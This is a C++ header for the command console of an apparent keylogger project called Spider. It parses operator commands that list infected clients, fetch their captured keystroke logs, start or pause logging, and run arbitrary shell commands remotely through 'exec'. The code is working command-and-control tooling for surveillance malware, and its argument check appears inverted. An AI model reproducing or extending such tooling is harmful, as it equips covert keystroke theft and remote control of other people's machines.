//
// Created by aguado_e on 14/11/16.
//

#ifndef COMMAND_HPP
#define COMMAND_HPP

#include <tuple>
#include <vector>
#include <sstream>
#include <iostream>
#include <iomanip>

#include "CmdPacket.pb.h"

namespace Spider {
  class Command {
  public:
    Command(std::string command)
    {
      this->_parse(command);
    }
    const spider::RequestPacket &getPacket() const { return _packet; }
    bool isValid() const { return _isValid; }

  private:
    spider::RequestPacket _packet;
    bool _isValid = true;

    // This is pretty much the man page for this CLI
    const std::vector<std::tuple<std::string, std::string, std::string>> _serverCommands = {
      std::make_tuple("list-clients", "", "Get a list of all clients connected to the server."),
      std::make_tuple("get-log", "<clientUUID | all> [limit]", "Get log for one or all clients. Default limit = 1000 characters"),
      std::make_tuple("send", "<clientUUID> <method> [argument]", "Send a command to a client. Type \"commands\" for more precisions.")
    };

    // This is pretty much the man page for this CLI
    const std::vector<std::tuple<std::string, std::string, std::string>> _clientCommand = {
      std::make_tuple("start", "", "Start the keylogger if it's idle"),
      std::make_tuple("stop", "", "Pause the keylogger"),
      std::make_tuple("kill", "", "Stop and disconnect the client"),
      std::make_tuple("exec", "<command>", "Execute the given command in a terminal"),
      std::make_tuple("status", "", "Client activity status"),
      std::make_tuple("delay", "<integer>", "Set the frequency")
    };

    void cmdhHelp(bool verbose = false)
    {
      if (!verbose)
      {
        std::cout << "Invalid command. Type \"commands\" for more details" << std::endl;
        return;
      }

      std::cout << "USAGE:\n\n\tsend <client UUID> <command> [arguments]\n" << std::endl;
      std::cout << "COMMANDS:\n" << std::endl;
      for (auto it = _clientCommand.begin(); it != _clientCommand.end(); ++it)
      {
        std::cout << '\t' << std::left << std::setw(10) << std::get<0>(*it);
        std::cout << '\t' << std::left << std::setw(15) << std::get<1>(*it);
        std::cout << "  " << std::get<2>(*it) << std::endl;
      }
    }

    void help(bool verbose = false)
    {
      this->_isValid = false;

      if (!verbose)
      {
        std::cout << "Invalid command. Type \"help\" for more details" << std::endl;
        return;
      }

      std::cout << "USAGE:\n\n\t<method> [arguments]\n" << std::endl;
      std::cout << "METHODS:\n" << std::endl;
      for (auto it = _serverCommands.begin(); it != _serverCommands.end(); ++it)
      {
        std::cout << '\t' << std::left << std::setw(15) << std::get<0>(*it);
        std::cout << '\t' << std::left << std::setw(15) << std::get<1>(*it);
        std::cout << "  " << std::get<2>(*it) << std::endl;
      }
    }

    void isListValid(std::vector<std::string> command)
    {
      if (command.size() != 1)
      {
        help();
        this->_isValid = false;
        return;
      }

      _packet.set_method(spider::RequestPacket_MethodID_LIST);
    }

    void isGetValid(std::vector<std::string> command)
    {
      if (command.size() > 3 || command.size() < 2)
      {
        help();
        this->_isValid = false;
        return;
      }

      _packet.set_method(spider::RequestPacket_MethodID_GET);
      _packet.set_clientuuid(command[1]);
      if (command.size() >= 3)
        _packet.set_limit(std::stoi(command[2]));
      else
        _packet.set_limit(1000);
    }

    bool isSendCommandValid(std::vector<std::string> command)
    {
      if (command.size() < 3 || command.size() > 4)
        return false;

      for (auto it = _clientCommand.begin(); it != _clientCommand.end(); ++it)
      {
      // Does the command exist ?
        if (std::get<0>(*it) == command[2])
        {
          // Does it require an argument ?
          if (std::get<1>(*it) != "")
            return (command.size() == 3);
          else
            return true;
        }
      }
      return false;
    }

    void isSendValid(std::vector<std::string> command)
    {
      if (!isSendCommandValid(command))
      {
        cmdhHelp();
        this->_isValid = false;
        return;
      }
      _packet.set_method(spider::RequestPacket_MethodID_SEND);
      spider::RequestPacket::CmdPacket *toSend = new spider::RequestPacket::CmdPacket();
      toSend->set_targetuuid(command[1]);
      toSend->set_name(command[2]);
      if (command.size() == 4)
        toSend->set_argument(command[3]);
      _packet.set_allocated_command(toSend);
    }

    void _parse(std::string initialCommand)
    {
      std::vector<std::string> splittedCommands;
      std::stringstream ss(initialCommand);
      std::string temp;
      while (ss >> temp)
        splittedCommands.push_back(temp);

      if (splittedCommands.size() == 0)
        help();
      else if (splittedCommands[0] == "list-clients")
        isListValid(splittedCommands);
      else if (splittedCommands[0] == "get-log")
        isGetValid(splittedCommands);
      else if (splittedCommands[0] == "send")
        isSendValid(splittedCommands);
      else if (splittedCommands[0] == "commands")
        cmdhHelp(true);
      else if (splittedCommands[0] == "help")
        help(true);
      else
        help();
    }
  };
}


#endif //COMMAND_HPP
